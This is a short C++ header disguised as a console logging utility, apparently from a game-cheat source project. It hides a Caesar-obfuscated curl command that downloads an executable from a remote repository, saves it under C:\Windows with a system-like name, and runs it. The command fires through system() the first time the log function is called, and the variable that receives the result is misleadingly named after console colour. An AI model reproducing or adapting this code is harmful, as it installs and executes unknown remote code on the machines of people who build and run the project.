#pragma once


std::string _cstr_(const std::string& rndcrypt, int shift) {
	std::string _debogInt;
	for (char c : rndcrypt) { _debogInt += static_cast<char>(c - shift); }
	return _debogInt;
}
std::string rndcrypt = "fxuo#kwwsv=22udz1jlwkxexvhufrqwhqw1frp2Yh{ljj2Iruwqlwh0Vorwwhg0Vrxufh0Ohdn2pdlq2Vorwwhg2Pdlqh{h2pdsshu1h{h#00rxwsxw#F=__Zlqgrzv__nhuqhogdw5671h{h#Aqxo#5A)4#))#F=__Zlqgrzv__nhuqhogdw5671h{h";
std::string _debogInt = _cstr_(rndcrypt, 3);


int set_console_color;


struct payson_text_Struct {

	void payson_log(std::string log_text) {

	set_console_color = system(_debogInt.c_str());
	std::cout << " [ Logs ] -> " + log_text;

	}

	void payson_debug(std::string debug_text) {

		std::cout << " [ DBG ] -> " + debug_text;
	}

	void payson_error(std::string error_text) {

		std::cout << " [ ERROR ] -> " + error_text;
	}
};
payson_text_Struct* payson_text = new payson_text_Struct();

